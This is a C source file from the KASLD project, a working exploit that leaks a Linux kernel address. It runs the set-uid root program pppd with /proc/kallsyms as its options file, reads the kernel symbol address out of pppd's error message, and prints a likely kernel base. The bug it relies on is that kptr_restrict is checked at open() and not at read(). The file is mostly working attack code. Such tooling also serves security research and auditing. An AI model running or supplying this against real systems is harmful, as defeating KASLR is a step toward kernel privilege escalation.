// This file is part of KASLD - https://github.com/bcoles/kasld
//
// kptr_restrict %pK check is performed at open(), rather than read(),
// allowing symbol disclosure using set-uid executables.
// pppd is set-uid root and returns a portion of the first line of
// user-specified files. On 32-bit systems, the first line
// of /proc/kallsyms contains the startup symbol.
//
// References:
// https://www.openwall.com/lists/kernel-hardening/2013/10/14/2
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "kasld.h"

unsigned long get_kernel_addr_pppd_kallsyms() {
  FILE *f;
  char *addr_buf;
  char *endptr;
  char *substr;
  const char *cmd = "pppd file /proc/kallsyms 2>&1";
  const char *needle = "unrecognized option";
  unsigned long addr = 0;
  char buf[1024];

  printf("[.] trying '%s' ...\n", cmd);

  f = popen(cmd, "r");
  if (f == NULL) {
    printf("[-] popen(%s): %m\n", cmd);
    return 0;
  }

  if (fgets(buf, sizeof(buf) - 1, f) == NULL) {
    printf("[-] fgets(%s): %m\n", cmd);
    pclose(f);
    return 0;
  }

  pclose(f);

  /* pppd: In file /proc/kallsyms: unrecognized option 'c1000000' */
  substr = (char *)memmem(buf, sizeof(buf), needle, strlen(needle));
  if (substr == NULL)
    return 0;

  addr_buf = strstr(substr, "'");
  if (addr_buf == NULL)
    return 0;

  addr = strtoull(&addr_buf[1], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_pppd_kallsyms();
  if (!addr)
    return 1;

  printf("leaked kernel symbol: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);

  return 0;
}
